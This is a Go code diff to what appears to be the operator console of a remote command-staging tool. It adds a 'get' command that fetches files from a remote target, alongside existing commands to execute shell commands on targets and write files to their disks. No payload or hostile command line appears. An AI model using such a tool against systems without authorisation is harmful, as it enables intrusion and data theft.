@@ -31,9 +31,11 @@ var (
 	outfile   = serveFile.Arg("outfile", "name of file to write to remote disk").Default("").String()
 	cmd       = app.Command("cmd", "stage a command")
 	exec      = cmd.Command("exec", "execute a shell command on target")
+	get       = cmd.Command("get", "get file(s) from a remote system")
 	viewCmd   = cmd.Command("view", "view current command stage")
 	deleteC   = cmd.Command("clear", "remove a command from the stage")
 	cmdstring = exec.Arg("command", "command to execute").Required().String()
+	files     = get.Arg("files", "array of files to fetch remotely, comma-separated").Required().String()
 	forwho    = app.Flag("for", "name of target to receive command").String()
 	unsafe    = serveFile.Flag("unsafe", "allows un-encrypted files to be written to disk remotely").Bool()
 )
@@ -44,6 +46,7 @@ func main() {
 		log.Fatal(err)
 	}
 	cmdMap["exec"] = 1
+	cmdMap["get"] = 3
 	switch kingpin.MustParse(app.Parse(os.Args[1:])) {
 	case viewFile.FullCommand():
 		content, err := datastore.ShowStage(filestage)
@@ -105,7 +108,9 @@ func main() {
 			log.Fatal(err)
 		}
 	case exec.FullCommand():
-		handleExec(db)
+		handleCmd(db, "exec")
+	case get.FullCommand():
+		handleCmd(db, "get")
 	case viewCmd.FullCommand():
 		content, err := datastore.ShowStage(cmdstage)
 		if err != nil {
@@ -120,18 +125,25 @@ func main() {
 	}
 }
 
-func handleExec(db *datastore.Kdb) {
-	cmdlet := cmdMap["exec"]
+func handleCmd(db *datastore.Kdb, myCmd string) {
+	cmdlet := cmdMap[myCmd]
 	cmdObj := &models.KarObjectCmd{}
 	cmdObj.Cmd = cmdlet
-	cmdObj.Args = append(cmdObj.Args, models.MultiType{StrValue: *cmdstring})
+	if len(*cmdstring) != 0 {
+		cmdObj.Args = append(cmdObj.Args, models.MultiType{StrValue: *cmdstring})
+	}
+	if len(*files) != 0 {
+		for _, f := range strings.Split(*files, ",") {
+			cmdObj.Args = append(cmdObj.Args, models.MultiType{StrValue: f})
+		}
+	}
 	bytes, err := json.Marshal(cmdObj)
 	if err != nil {
 		log.Fatal(err)
 	}
 	index := 0
 	for i, n := range os.Args {
-		if n == "exec" {
+		if n == myCmd {
 			index = i
 		}
 	}
